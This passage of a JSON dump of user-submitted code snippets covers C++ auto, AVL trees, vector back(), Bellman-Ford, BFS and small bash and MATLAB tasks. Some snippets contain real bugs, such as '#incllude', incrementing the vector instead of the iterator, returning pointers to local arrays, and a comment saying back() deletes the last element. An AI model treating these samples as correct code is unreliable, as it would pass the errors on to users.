    "description": "#include <iostream> using namespace std; int main(){    //Pointer declaration    int *p, var=101;      //Assignment    p = &var;     cout<<\"Address of var: \"<<&var<<endl;    cout<<\"Address of var: \"<<p<<endl;    cout<<\"Address of p: \"<<&p<<endl;    cout<<\"Value of var: \"<<*p;    return 0; }\nint foo = 0; auto bar = foo;  // the same as: int bar = foo;  // type of bar is the type of the value used to initialize it\n#include<iostream> #incllude<vector> using namespace std;  int main() {    vector<int> vec(10);       // Auto deduce type to be iterator of a vector of ints.    for(auto it = vec.begin(); it != vec.end(); vec ++)    {       cin >> *it;    }    return 0; }\n",
    "reg_date": "2021-10-12T11:37:26.000Z"
  },
  {
    "id": 570,
    "keyword": null,
    "link": null,
    "title": " auto in cpp",
    "description": "int foo = 0; auto bar = foo;  // the same as: int bar = foo;  // type of bar is the type of the value used to initialize it\n#include<iostream> #incllude<vector> using namespace std;  int main() {    vector<int> vec(10);       // Auto deduce type to be iterator of a vector of ints.    for(auto it = vec.begin(); it != vec.end(); vec ++)    {       cin >> *it;    }    return 0; }\n",
    "reg_date": "2021-10-12T11:37:26.000Z"
  },
  {
    "id": 571,
    "keyword": null,
    "link": null,
    "title": " auto keyword",
    "description": "//Uploaded by Kaisar Najar #include<iostream> #incllude<vector> using namespace std;  int main() {    vector<int> vec(10);       // Auto deduce type to be iterator of a vector of ints.    for(auto it = vec.begin(); it != vec.end(); vec ++)    {       cin >> *it;    }    return 0; }\n",
    "reg_date": "2021-10-12T11:37:26.000Z"
  },
  {
    "id": 572,
    "keyword": null,
    "link": null,
    "title": " automatic legend matlab",
    "description": "str = {strcat('z = ' , num2str(z))}  % at the end of first loop, z being loop output str = [str , strcat('z = ' , num2str(z))] % after 2nd loop % plot your data legend(str{:})\n",
    "reg_date": "2021-10-12T11:37:26.000Z"
  },
  {
    "id": 573,
    "keyword": null,
    "link": null,
    "title": " avl tree implementation c++",
    "description": "// AVL tree implementation in C++  #include <iostream> using namespace std;  class Node {    public:   int key;   Node *left;   Node *right;   int height; };  int max(int a, int b);  // Calculate height int height(Node *N) {   if (N == NULL)     return 0;   return N->height; }  int max(int a, int b) {   return (a > b) ? a : b; }  // New node creation Node *newNode(int key) {   Node *node = new Node();   node->key = key;   node->left = NULL;   node->right = NULL;   node->height = 1;   return (node); }  // Rotate right Node *rightRotate(Node *y) {   Node *x = y->left;   Node *T2 = x->right;   x->right = y;   y->left = T2;   y->height = max(height(y->left),           height(y->right)) +         1;   x->height = max(height(x->left),           height(x->right)) +         1;   return x; }  // Rotate left Node *leftRotate(Node *x) {   Node *y = x->right;   Node *T2 = y->left;   y->left = x;   x->right = T2;   x->height = max(height(x->left),           height(x->right)) +         1;   y->height = max(height(y->left),           height(y->right)) +         1;   return y; }  // Get the balance factor of each node int getBalanceFactor(Node *N) {   if (N == NULL)     return 0;   return height(N->left) -        height(N->right); }  // Insert a node Node *insertNode(Node *node, int key) {   // Find the correct postion and insert the node   if (node == NULL)     return (newNode(key));   if (key < node->key)     node->left = insertNode(node->left, key);   else if (key > node->key)     node->right = insertNode(node->right, key);   else     return node;    // Update the balance factor of each node and   // balance the tree   node->height = 1 + max(height(node->left),                height(node->right));   int balanceFactor = getBalanceFactor(node);   if (balanceFactor > 1) {     if (key < node->left->key) {       return rightRotate(node);     } else if (key > node->left->key) {       node->left = leftRotate(node->left);       return rightRotate(node);     }   }   if (balanceFactor < -1) {     if (key > node->right->key) {       return leftRotate(node);     } else if (key < node->right->key) {       node->right = rightRotate(node->right);       return leftRotate(node);     }   }   return node; }  // Node with minimum value Node *nodeWithMimumValue(Node *node) {   Node *current = node;   while (current->left != NULL)     current = current->left;   return current; }  // Delete a node Node *deleteNode(Node *root, int key) {   // Find the node and delete it   if (root == NULL)     return root;   if (key < root->key)     root->left = deleteNode(root->left, key);   else if (key > root->key)     root->right = deleteNode(root->right, key);   else {     if ((root->left == NULL) ||       (root->right == NULL)) {       Node *temp = root->left ? root->left : root->right;       if (temp == NULL) {         temp = root;         root = NULL;       } else         *root = *temp;       free(temp);     } else {       Node *temp = nodeWithMimumValue(root->right);       root->key = temp->key;       root->right = deleteNode(root->right,                    temp->key);     }   }    if (root == NULL)     return root;    // Update the balance factor of each node and   // balance the tree   root->height = 1 + max(height(root->left),                height(root->right));   int balanceFactor = getBalanceFactor(root);   if (balanceFactor > 1) {     if (getBalanceFactor(root->left) >= 0) {       return rightRotate(root);     } else {       root->left = leftRotate(root->left);       return rightRotate(root);     }   }   if (balanceFactor < -1) {     if (getBalanceFactor(root->right) <= 0) {       return leftRotate(root);     } else {       root->right = rightRotate(root->right);       return leftRotate(root);     }   }   return root; }  // Print the tree void printTree(Node *root, string indent, bool last) {   if (root != nullptr) {     cout << indent;     if (last) {       cout << \"R----\";       indent += \"   \";     } else {       cout << \"L----\";       indent += \"|  \";     }     cout << root->key << endl;     printTree(root->left, indent, false);     printTree(root->right, indent, true);   } }  int main() {   Node *root = NULL;   root = insertNode(root, 33);   root = insertNode(root, 13);   root = insertNode(root, 53);   root = insertNode(root, 9);   root = insertNode(root, 21);   root = insertNode(root, 61);   root = insertNode(root, 8);   root = insertNode(root, 11);   printTree(root, \"\", true);   root = deleteNode(root, 13);   cout << \"After deleting \" << endl;   printTree(root, \"\", true); }\n#include <stdio.h> #include \"avltree.h\" /*     remove all nodes of an AVL tree */ void dispose(node* t) {     if( t != NULL )     {         dispose( t->left );         dispose( t->right );         free( t );     } }   /*     find a specific node's key in the tree */ node* find(int e, node* t ) {     if( t == NULL )         return NULL;     if( e < t->data )         return find( e, t->left );     else if( e > t->data )         return find( e, t->right );     else         return t; }   /*     find minimum node's key */ node* find_min( node* t ) {     if( t == NULL )         return NULL;     else if( t->left == NULL )         return t;     else         return find_min( t->left ); }   /*     find maximum node's key */ node* find_max( node* t ) {     if( t != NULL )         while( t->right != NULL )             t = t->right;       return t; }   /*     get the height of a node */ static int height( node* n ) {     if( n == NULL )         return -1;     else         return n->height; }   /*     get maximum value of two integers */ static int max( int l, int r) {     return l > r ? l: r; }   /*     perform a rotation between a k2 node and its left child       note: call single_rotate_with_left only if k2 node has a left child */   static node* single_rotate_with_left( node* k2 ) {     node* k1 = NULL;       k1 = k2->left;     k2->left = k1->right;     k1->right = k2;       k2->height = max( height( k2->left ), height( k2->right ) ) + 1;     k1->height = max( height( k1->left ), k2->height ) + 1;     return k1; /* new root */ }   /*     perform a rotation between a node (k1) and its right child       note: call single_rotate_with_right only if     the k1 node has a right child */   static node* single_rotate_with_right( node* k1 ) {     node* k2;       k2 = k1->right;     k1->right = k2->left;     k2->left = k1;       k1->height = max( height( k1->left ), height( k1->right ) ) + 1;     k2->height = max( height( k2->right ), k1->height ) + 1;       return k2;  /* New root */ }   /*       perform the left-right double rotation,       note: call double_rotate_with_left only if k3 node has     a left child and k3's left child has a right child */   static node* double_rotate_with_left( node* k3 ) {     /* Rotate between k1 and k2 */     k3->left = single_rotate_with_right( k3->left );       /* Rotate between K3 and k2 */     return single_rotate_with_left( k3 ); }   /*     perform the right-left double rotation      notes: call double_rotate_with_right only if k1 has a    right child and k1's right child has a left child */       static node* double_rotate_with_right( node* k1 ) {     /* rotate between K3 and k2 */     k1->right = single_rotate_with_left( k1->right );       /* rotate between k1 and k2 */     return single_rotate_with_right( k1 ); }   /*     insert a new node into the tree */ node* insert(int e, node* t ) {     if( t == NULL )     {         /* Create and return a one-node tree */         t = (node*)malloc(sizeof(node));         if( t == NULL )         {             fprintf (stderr, \"Out of memory!!! (insert)\\n\");             exit(1);         }         else         {             t->data = e;             t->height = 0;             t->left = t->right = NULL;         }     }     else if( e < t->data )     {         t->left = insert( e, t->left );         if( height( t->left ) - height( t->right ) == 2 )             if( e < t->left->data )                 t = single_rotate_with_left( t );             else                 t = double_rotate_with_left( t );     }     else if( e > t->data )     {         t->right = insert( e, t->right );         if( height( t->right ) - height( t->left ) == 2 )             if( e > t->right->data )                 t = single_rotate_with_right( t );             else                 t = double_rotate_with_right( t );     }     /* Else X is in the tree already; we'll do nothing */       t->height = max( height( t->left ), height( t->right ) ) + 1;     return t; }   /*     remove a node in the tree */ node* delete( int e, node* t ) {     printf( \"Sorry; Delete is unimplemented; %d remains\\n\", e );     return t; }   /*     data data of a node */ int get(node* n) {     return n->data; }   /*     Recursively display AVL tree or subtree */ void display_avl(node* t) {     if (t == NULL)         return;     printf(\"%d\",t->data);       if(t->left != NULL)         printf(\"(L:%d)\",t->left->data);     if(t->right != NULL)         printf(\"(R:%d)\",t->right->data);     printf(\"\\n\");       display_avl(t->left);     display_avl(t->right); } \n",
    "reg_date": "2021-10-12T11:37:26.000Z"
  },
  {
    "id": 574,
    "keyword": null,
    "link": null,
    "title": " avrational compare",
    "description": "int av_cmp_q(AVRational a, AVRational b);  0 if a == b 1 if a > b -1 if a < b\n",
    "reg_date": "2021-10-12T11:37:26.000Z"
  },
  {
    "id": 575,
    "keyword": null,
    "link": null,
    "title": " back() in c++",
    "description": "// vector::back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;    myvector.push_back(10);    while (myvector.back() != 0)   {     myvector.push_back ( myvector.back() -1 );   }    std::cout << \"myvector contains:\";   for (unsigned i=0; i<myvector.size() ; i++)     std::cout << ' ' << myvector[i];   std::cout << '\\n';    return 0; }\n// my linkedin : https://www.linkedin.com/in/vaalarivan-prasanna-3a07bb203/ vector<int> vec = {1, 2, 5, 6}; int ele = vec.back();  //ele = 6 //back() method does delete the last element from the vector, it just returns\\n //the last element. \n#include <iostream> #include <vector>  int main() {   std::vector<int> myvector;      //add 2 to the back   myvector.push_back(2);      std::cout << myvector.back() << std::endl; //this will print 2      myvector.push_back(46);   std::cout << myvector.back() << std::endl; //prints 46      return 0;    }  /*Output 2 46 */\n// string::back #include <iostream> #include <string>  int main () {   std::string str (\"hello world.\");   str.back() = '!';   std::cout << str << '\\n';   return 0; }\n",
    "reg_date": "2021-10-12T11:37:26.000Z"
  },
  {
    "id": 576,
    "keyword": null,
    "link": null,
    "title": " back inserter in vector c++",
    "description": "// back_inserter example #include <iostream>     // std::cout #include <iterator>     // std::back_inserter #include <vector>       // std::vector #include <algorithm>    // std::copy  int main () {   std::vector<int> foo,bar;   for (int i=1; i<=5; i++)   { foo.push_back(i); bar.push_back(i*10); }    std::copy (bar.begin(),bar.end(),back_inserter(foo));    std::cout << \"foo contains:\";   for ( std::vector<int>::iterator it = foo.begin(); it!= foo.end(); ++it ) \t  std::cout << ' ' << *it;   std::cout << '\\n';    return 0; }\n",
    "reg_date": "2021-10-12T11:37:27.000Z"
  },
  {
    "id": 577,
    "keyword": null,
    "link": null,
    "title": " back inserter vs push back",
    "description": "std::vector<std::string> a(100, \"Hello, World\"); std::vector<std::string> b; std::copy(a.begin(), a.end(), std::back_inserter(b));\n",
    "reg_date": "2021-10-12T11:37:27.000Z"
  },
  {
    "id": 578,
    "keyword": null,
    "link": null,
    "title": " backward chaining python",
    "description": "?- diagnosis(X). \n",
    "reg_date": "2021-10-12T11:37:27.000Z"
  },
  {
    "id": 579,
    "keyword": null,
    "link": null,
    "title": " balanced brackets hackerrank solution in cpp",
    "description": "#include <iostream> #include <algorithm> #include <unordered_map> #include <stack> using namespace std; string isBalanced(string s){     stack <char> st;     for(auto c:s){         switch (c){             case '(':             case '{':             case '[':                   st.push(c);                    break;             case '}':                 if(st.empty() || st.top()!='{' )                     return \"NO\";                 st.pop();                 break;             case ']':                 if(st.empty() || st.top()!='[')                     return \"NO\";                 st.pop();                 break;             case ')':                 if(st.empty() || st.top()!='(')                     return \"NO\";                 st.pop();                 break;             default: break;         }     }     return st.empty() ? \"YES\":\"NO\"; }  int main(){     int t;     cin >> t;     for(int a0 = 0; a0 < t; a0++){         string s;         cin >> s;         cout << isBalanced(s) << endl;     }     return 0; } \n",
    "reg_date": "2021-10-12T11:37:27.000Z"
  },
  {
    "id": 580,
    "keyword": null,
    "link": null,
    "title": " bash find into array",
    "description": "readarray -d '' array < <(find . -name \"$input\" -print0) \n",
    "reg_date": "2021-10-12T11:37:27.000Z"
  },
  {
    "id": 581,
    "keyword": null,
    "link": null,
    "title": " bash script add another user",
    "description": "sudo adduser myuser --gecos \"First Last,RoomNumber,WorkPhone,HomePhone\" --disabled-password echo \"myuser:password\" | sudo chpasswd \n",
    "reg_date": "2021-10-12T11:37:27.000Z"
  },
  {
    "id": 582,
    "keyword": null,
    "link": null,
    "title": " bash test empty directory",
    "description": "#!/bin/bash  DIR=\"/empty_dir\"  # look for empty dir  if [ \"$(ls -A $DIR)\" ]; then      echo \"Take action $DIR is not Empty\" else     echo \"$DIR is Empty\" fi \n",
    "reg_date": "2021-10-12T11:37:27.000Z"
  },
  {
    "id": 583,
    "keyword": null,
    "link": null,
    "title": " basic c++ programs",
    "description": "// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n#include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n",
    "reg_date": "2021-10-12T11:37:27.000Z"
  },
  {
    "id": 584,
    "keyword": null,
    "link": null,
    "title": " basic cpp programs",
    "description": "// Your First C++ Program  #include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; } \n#include<iostream.h> #include<conio.h> void main() { \tclrscr();  // clear the screen \tcout<<\"Hello Compiler, I am C++\"; \tgetch();  // holds output screen until user press a key }\n#include <iostream>  int main() {     std::cout << \"Hello World!\";     return 0; }\n",
    "reg_date": "2021-10-12T11:37:27.000Z"
  },
  {
    "id": 585,
    "keyword": null,
    "link": null,
    "title": " basic data types in c++ hackerrank solution",
    "description": "#include <iostream> using std::cin; using std::cout; using std::endl; using std::fixed;  int main() {     int a; long b; char c; float d; double e;     cin>>a>>b>>c>>d>>e;     cout<<a<<endl;     cout<<b<<endl;     cout<<c<<endl;     cout.precision(3);     cout<<fixed<<d<<endl;     cout.precision(9);     cout<<fixed<<e<<endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:37:28.000Z"
  },
  {
    "id": 586,
    "keyword": null,
    "link": null,
    "title": " basic ex of maps in c++",
    "description": "#include <iostream>  #include <iterator>  #include <map>      using namespace std;      int main()  {       map<int, int> marks;       marks.insert(pair<int, int>(160, 42));       marks.insert(pair<int, int>(161, 30));       marks.insert(pair<int, int>(162, 40));       marks.insert(pair<int, int>(163, 50));       marks.insert(pair<int, int>(164, 31));       marks.insert(pair<int, int>(165, 12));       marks.insert(pair<int, int>(166, 34));           map<int, int>::iterator itr;       cout << \"nThe map marks is : n\";       cout << \"ROLL NO.tMarksn\";       for (itr =  marks.begin(); itr !=  marks.end(); ++itr) {          cout  << itr->first               << \"t   t\" << itr->second << 'n';       }       cout << endl;       return 0;        } \n",
    "reg_date": "2021-10-12T11:37:28.000Z"
  },
  {
    "id": 587,
    "keyword": null,
    "link": null,
    "title": " bellman ford algorithm",
    "description": "#include<iostream> #define MAX 10 using namespace std; typedef struct edge {   int src;   int dest;   int wt; }edge; void bellman_ford(int nv,edge e[],int src_graph,int ne) {   int u,v,weight,i,j=0;   int dis[MAX];      /* initializing array 'dis' with 999. 999 denotes infinite distance */   for(i=0;i<nv;i++)   {     dis[i]=999;   }        /* distance of source vertex from source vertex is o */   dis[src_graph]=0;      /* relaxing all the edges nv - 1 times */   for(i=0;i<nv-1;i++)   {     for(j=0;j<ne;j++)     {       u=e[j].src;       v=e[j].dest;       weight=e[j].wt;            if(dis[u]!=999 && dis[u]+weight < dis[v])       {         dis[v]=dis[u]+weight;       }       }        }      /* checking if negative cycle is present */   for(j=0;j<ne;j++)   {     u=e[j].src;     v=e[j].dest;     weight=e[j].wt;          if(dis[u]+weight < dis[v])     {       cout<<\"\\n\\nNEGATIVE CYCLE PRESENT..!!\\n\";       return;     }     }      cout<<\"\\nVertex\"<<\"  Distance from source\";   for(i=1;i<=nv;i++)   {     cout<<\"\\n\"<<i<<\"\\t\"<<dis[i];   } } int main() {   int nv,ne,src_graph;   edge e[MAX];      cout<<\"Enter the number of vertices: \";   cin>>nv;        /* if you enter no of vertices: 5 then vertices will be 1,2,3,4,5. so while giving input enter source and destination vertex accordingly */   printf(\"Enter the source vertex of the graph: \");   cin>>src_graph;        cout<<\"\\nEnter no. of edges: \";   cin>>ne;      for(int i=0;i<ne;i++)   {     cout<<\"\\nFor edge \"<<i+1<<\"=>\";     cout<<\"\\nEnter source vertex :\";     cin>>e[i].src;     cout<<\"Enter destination vertex :\";     cin>>e[i].dest;     cout<<\"Enter weight :\";     cin>>e[i].wt;     }      bellman_ford(nv,e,src_graph,ne);      return 0; }\n//It is an algorithm to detect negative cycle in a graph as well as can we used to find the shortest distance from source  #include<bits/stdc++.h> using namespace std; struct node {     int u,v,wt;     node(int first,int second ,int weight)     {         u=first;         v=second;         wt=weight;     } }; int main() {    int vertex,edges;    cout<<\"ENTER THE NUMBER OF VERTEX AND EDGES:\"<<endl;    cin>>vertex>>edges;    vector<node>adj;    cout<<\"ENTER THE LINKS:\"<<endl;    int a,b,w;    for(int i=0;i<edges;i++)    {        cin>>a>>b>>w;        adj.push_back(node(a,b,w));    }    int src;    cout<<\"ENTER THE SOURCE\"<<endl;    cin>>src;    int large=100000;    vector<int>dist(vertex,large);    dist[src]=0;    for(int i=1;i<=vertex-1;i++)    {        for(auto it:adj)        {            if(dist[it.u]+it.wt<dist[it.v])            {                dist[it.v]=dist[it.u]+it.wt;            }        }    }    int flag=0;    for(auto it:adj)        {            if(dist[it.u]+it.wt<dist[it.v])            {                cout<<\"NEGATIVE CYCLE DETECTED:\"<<endl;                flag=1;                break;            }        }        if(!flag)        {            for(int i=0;i<vertex;i++)            {                cout<<i<<\" \"<<dist[i]<<endl;            }        }        return 0; } \nstruct edge {     int a, b, cost; };  int n, m, v; vector<edge> e; const int INF = 1000000000;  void solve() {     vector<int> d (n, INF);     d[v] = 0;     for (int i=0; i<n-1; ++i)         for (int j=0; j<m; ++j)             if (d[e[j].a] < INF)                 d[e[j].b] = min (d[e[j].b], d[e[j].a] + e[j].cost);     // display d, for example, on the screen } \n#include <vector> #include <iostream> using namespace std;  #define INF 99999;  struct Edge { \tint u, v, w; };  int V; \t\t\t\t\t\t\t// Number of verticies. vector<vector<Edge>> adjList;\t// Adjacency list. vector<vector<int>> adjMatrix;\t// Adjacency matrix.  // With adjacency list. int* shortestPath(int src) { \tint dist[V];   \tfor (int u = 0; u < V; ++u)       dist[u] = INF;   \tdist[src] = 0;  \tfor (int i = 0; i < V - 1; ++i) \t\tfor (int u = 0; u < V; ++u) \t\t\tfor (Edge e : adjList[u]) \t\t\t\tif (dist[e.u] + e.w < dist[e.v])           \t\t\tdist[e.v] = dist[e.u] + e.w;      \tfor (int u = 0; u < V; ++u) \t\tfor (Edge e : adjList[u])         \tif (dist[e.u] + e.w < dist[e.v])             \tthrow std::runtime_error(\"negative loop detected\")          // contains the shortest dist between src and each vertex.   \treturn dist; }  // With adjacency matrix. int* shortestPath(int src) { \tint dist[V];   \tfor (int u = 0; u < V; ++u)       dist[u] = INF;   \tdist[src] = 0;  \tfor (int i = 0; i < V - 1; ++i) \t\tfor (int u = 0; u < V; ++u) \t\t\tfor (int v = 0; v < V; ++v) \t\t\t\tif (dist[u] + adjMatrix[u][v] < dist[v])           \t\t\tdist[v] = dist[u] + adjMatrix[u][v];      \tfor (int u = 0; u < V; ++u) \t\tfor (int v = 0; v < V; ++v)         \tif (dist[u] + adjMatrix[u][v] < dist[v])             \tthrow std::runtime_error(\"negative loop detected\")          // contains the shortest dist between src and each vertex.   \treturn dist; }\n",
    "reg_date": "2021-10-12T11:37:28.000Z"
  },
  {
    "id": 588,
    "keyword": null,
    "link": null,
    "title": " bellman ford algorithm cp algorithm",
    "description": "//It is an algorithm to detect negative cycle in a graph as well as can we used to find the shortest distance from source  #include<bits/stdc++.h> using namespace std; struct node {     int u,v,wt;     node(int first,int second ,int weight)     {         u=first;         v=second;         wt=weight;     } }; int main() {    int vertex,edges;    cout<<\"ENTER THE NUMBER OF VERTEX AND EDGES:\"<<endl;    cin>>vertex>>edges;    vector<node>adj;    cout<<\"ENTER THE LINKS:\"<<endl;    int a,b,w;    for(int i=0;i<edges;i++)    {        cin>>a>>b>>w;        adj.push_back(node(a,b,w));    }    int src;    cout<<\"ENTER THE SOURCE\"<<endl;    cin>>src;    int large=100000;    vector<int>dist(vertex,large);    dist[src]=0;    for(int i=1;i<=vertex-1;i++)    {        for(auto it:adj)        {            if(dist[it.u]+it.wt<dist[it.v])            {                dist[it.v]=dist[it.u]+it.wt;            }        }    }    int flag=0;    for(auto it:adj)        {            if(dist[it.u]+it.wt<dist[it.v])            {                cout<<\"NEGATIVE CYCLE DETECTED:\"<<endl;                flag=1;                break;            }        }        if(!flag)        {            for(int i=0;i<vertex;i++)            {                cout<<i<<\" \"<<dist[i]<<endl;            }        }        return 0; } \nstruct edge {     int a, b, cost; };  int n, m, v; vector<edge> e; const int INF = 1000000000;  void solve() {     vector<int> d (n, INF);     d[v] = 0;     for (int i=0; i<n-1; ++i)         for (int j=0; j<m; ++j)             if (d[e[j].a] < INF)                 d[e[j].b] = min (d[e[j].b], d[e[j].a] + e[j].cost);     // display d, for example, on the screen } \n#include <vector> #include <iostream> using namespace std;  #define INF 99999;  struct Edge { \tint u, v, w; };  int V; \t\t\t\t\t\t\t// Number of verticies. vector<vector<Edge>> adjList;\t// Adjacency list. vector<vector<int>> adjMatrix;\t// Adjacency matrix.  // With adjacency list. int* shortestPath(int src) { \tint dist[V];   \tfor (int u = 0; u < V; ++u)       dist[u] = INF;   \tdist[src] = 0;  \tfor (int i = 0; i < V - 1; ++i) \t\tfor (int u = 0; u < V; ++u) \t\t\tfor (Edge e : adjList[u]) \t\t\t\tif (dist[e.u] + e.w < dist[e.v])           \t\t\tdist[e.v] = dist[e.u] + e.w;      \tfor (int u = 0; u < V; ++u) \t\tfor (Edge e : adjList[u])         \tif (dist[e.u] + e.w < dist[e.v])             \tthrow std::runtime_error(\"negative loop detected\")          // contains the shortest dist between src and each vertex.   \treturn dist; }  // With adjacency matrix. int* shortestPath(int src) { \tint dist[V];   \tfor (int u = 0; u < V; ++u)       dist[u] = INF;   \tdist[src] = 0;  \tfor (int i = 0; i < V - 1; ++i) \t\tfor (int u = 0; u < V; ++u) \t\t\tfor (int v = 0; v < V; ++v) \t\t\t\tif (dist[u] + adjMatrix[u][v] < dist[v])           \t\t\tdist[v] = dist[u] + adjMatrix[u][v];      \tfor (int u = 0; u < V; ++u) \t\tfor (int v = 0; v < V; ++v)         \tif (dist[u] + adjMatrix[u][v] < dist[v])             \tthrow std::runtime_error(\"negative loop detected\")          // contains the shortest dist between src and each vertex.   \treturn dist; }\n",
    "reg_date": "2021-10-12T11:37:28.000Z"
  },
  {
    "id": 589,
    "keyword": null,
    "link": null,
    "title": " bellman ford code in c++",
    "description": "#include<iostream> #define MAX 10 using namespace std; typedef struct edge {   int src;   int dest;   int wt; }edge; void bellman_ford(int nv,edge e[],int src_graph,int ne) {   int u,v,weight,i,j=0;   int dis[MAX];      /* initializing array 'dis' with 999. 999 denotes infinite distance */   for(i=0;i<nv;i++)   {     dis[i]=999;   }        /* distance of source vertex from source vertex is o */   dis[src_graph]=0;      /* relaxing all the edges nv - 1 times */   for(i=0;i<nv-1;i++)   {     for(j=0;j<ne;j++)     {       u=e[j].src;       v=e[j].dest;       weight=e[j].wt;            if(dis[u]!=999 && dis[u]+weight < dis[v])       {         dis[v]=dis[u]+weight;       }       }        }      /* checking if negative cycle is present */   for(j=0;j<ne;j++)   {     u=e[j].src;     v=e[j].dest;     weight=e[j].wt;          if(dis[u]+weight < dis[v])     {       cout<<\"\\n\\nNEGATIVE CYCLE PRESENT..!!\\n\";       return;     }     }      cout<<\"\\nVertex\"<<\"  Distance from source\";   for(i=1;i<=nv;i++)   {     cout<<\"\\n\"<<i<<\"\\t\"<<dis[i];   } } int main() {   int nv,ne,src_graph;   edge e[MAX];      cout<<\"Enter the number of vertices: \";   cin>>nv;        /* if you enter no of vertices: 5 then vertices will be 1,2,3,4,5. so while giving input enter source and destination vertex accordingly */   printf(\"Enter the source vertex of the graph: \");   cin>>src_graph;        cout<<\"\\nEnter no. of edges: \";   cin>>ne;      for(int i=0;i<ne;i++)   {     cout<<\"\\nFor edge \"<<i+1<<\"=>\";     cout<<\"\\nEnter source vertex :\";     cin>>e[i].src;     cout<<\"Enter destination vertex :\";     cin>>e[i].dest;     cout<<\"Enter weight :\";     cin>>e[i].wt;     }      bellman_ford(nv,e,src_graph,ne);      return 0; }\n",
    "reg_date": "2021-10-12T11:37:28.000Z"
  },
  {
    "id": 590,
    "keyword": null,
    "link": null,
    "title": " best clips recording software for cs go",
    "description": "// when iOS simulator is running xcrun simctl io booted recordVideo <filename>.<file extension>\n",
    "reg_date": "2021-10-12T11:37:28.000Z"
  },
  {
    "id": 591,
    "keyword": null,
    "link": null,
    "title": " bfs sudocode",
    "description": "BFS (G, s)                   //Where G is the graph and s is the source node       let Q be queue.       Q.enqueue( s ) //Inserting s in queue until all its neighbour vertices are marked.        mark s as visited.       while ( Q is not empty)            //Removing that vertex from queue,whose neighbour will be visited now            v  =  Q.dequeue( )            //processing all the neighbours of v             for all neighbours w of v in Graph G                if w is not visited                          Q.enqueue( w )             //Stores w in Q to further visit its neighbour                         mark w as visited.\n",
    "reg_date": "2021-10-12T11:37:28.000Z"
  },
  {
    "id": 592,
    "keyword": null,
    "link": null,
    "title": " bfs traversal of graph in c",
    "description": "// BFS algorithm in C  #include <stdio.h> #include <stdlib.h> #define SIZE 40  struct queue {   int items[SIZE];   int front;   int rear; };  struct queue* createQueue(); void enqueue(struct queue* q, int); int dequeue(struct queue* q); void display(struct queue* q); int isEmpty(struct queue* q); void printQueue(struct queue* q);  struct node {   int vertex;   struct node* next; };  struct node* createNode(int);  struct Graph {   int numVertices;   struct node** adjLists;   int* visited; };  // BFS algorithm void bfs(struct Graph* graph, int startVertex) {   struct queue* q = createQueue();    graph->visited[startVertex] = 1;   enqueue(q, startVertex);    while (!isEmpty(q)) {     printQueue(q);     int currentVertex = dequeue(q);     printf(\"Visited %d\\n\", currentVertex);      struct node* temp = graph->adjLists[currentVertex];      while (temp) {       int adjVertex = temp->vertex;        if (graph->visited[adjVertex] == 0) {         graph->visited[adjVertex] = 1;         enqueue(q, adjVertex);       }       temp = temp->next;     }   } }  // Creating a node struct node* createNode(int v) {   struct node* newNode = malloc(sizeof(struct node));   newNode->vertex = v;   newNode->next = NULL;   return newNode; }  // Creating a graph struct Graph* createGraph(int vertices) {   struct Graph* graph = malloc(sizeof(struct Graph));   graph->numVertices = vertices;    graph->adjLists = malloc(vertices * sizeof(struct node*));   graph->visited = malloc(vertices * sizeof(int));    int i;   for (i = 0; i < vertices; i++) {     graph->adjLists[i] = NULL;     graph->visited[i] = 0;   }    return graph; }  // Add edge void addEdge(struct Graph* graph, int src, int dest) {   // Add edge from src to dest   struct node* newNode = createNode(dest);   newNode->next = graph->adjLists[src];   graph->adjLists[src] = newNode;    // Add edge from dest to src   newNode = createNode(src);   newNode->next = graph->adjLists[dest];   graph->adjLists[dest] = newNode; }  // Create a queue struct queue* createQueue() {   struct queue* q = malloc(sizeof(struct queue));   q->front = -1;   q->rear = -1;   return q; }  // Check if the queue is empty int isEmpty(struct queue* q) {   if (q->rear == -1)     return 1;   else     return 0; }  // Adding elements into queue void enqueue(struct queue* q, int value) {   if (q->rear == SIZE - 1)     printf(\"\\nQueue is Full!!\");   else {     if (q->front == -1)       q->front = 0;     q->rear++;     q->items[q->rear] = value;   } }  // Removing elements from queue int dequeue(struct queue* q) {   int item;   if (isEmpty(q)) {     printf(\"Queue is empty\");     item = -1;   } else {     item = q->items[q->front];     q->front++;     if (q->front > q->rear) {       printf(\"Resetting queue \");       q->front = q->rear = -1;     }   }   return item; }  // Print the queue void printQueue(struct queue* q) {   int i = q->front;    if (isEmpty(q)) {     printf(\"Queue is empty\");   } else {     printf(\"\\nQueue contains \\n\");     for (i = q->front; i < q->rear + 1; i++) {       printf(\"%d \", q->items[i]);     }   } }  int main() {   struct Graph* graph = createGraph(6);   addEdge(graph, 0, 1);   addEdge(graph, 0, 2);   addEdge(graph, 1, 2);   addEdge(graph, 1, 4);   addEdge(graph, 1, 3);   addEdge(graph, 2, 4);   addEdge(graph, 3, 4);    bfs(graph, 0);    return 0; }\nins 20 ins 10 ins 30 ins 60 ins 8 ins 11\n#include <bits/stdc++.h> using namespace std; #define ll  long long int #define ull unsigned long long int void addedge(vector<int>adj[],int u,int v) {     adj[u].push_back(v);     adj[v].push_back(u); } void print_list(vector <int> adj[],int n) {     for(int i=0;i<n;i++)     {         cout << \"adjacency list for node\" << i << \"is :\\n\";         for(auto ele: adj[i])         {             cout << \"->\" << ele << \" \\n\";         }      } } void BFS(int v,int e,vector<int>adj[]) {     bool visited[e];     for(int i=0;i<e;i++)     {         visited[i]= false;     }     list<int>queue;     visited[v]= true;     queue.push_back(v);     while (!queue.empty())     {         v = queue.front();         cout << v << \" \";         queue.pop_front();         for(auto ele:adj[v])         {             if(!visited[ele])             {                 visited[ele]= true;                 queue.push_back(ele);              }         }     } }   int main() {     int n,e;     cin >> n >> e;     vector <int> adj[n];     int u,v;     for(int i=0;i<e;i++)     {          cin >> u >> v;         addedge(adj,u,v);      }     print_list(adj,n);     BFS(v,e,adj);       return 0; }\n",
    "reg_date": "2021-10-12T11:37:28.000Z"
  },
  {
    "id": 593,
    "keyword": null,
    "link": null,
    "title": " bigint",
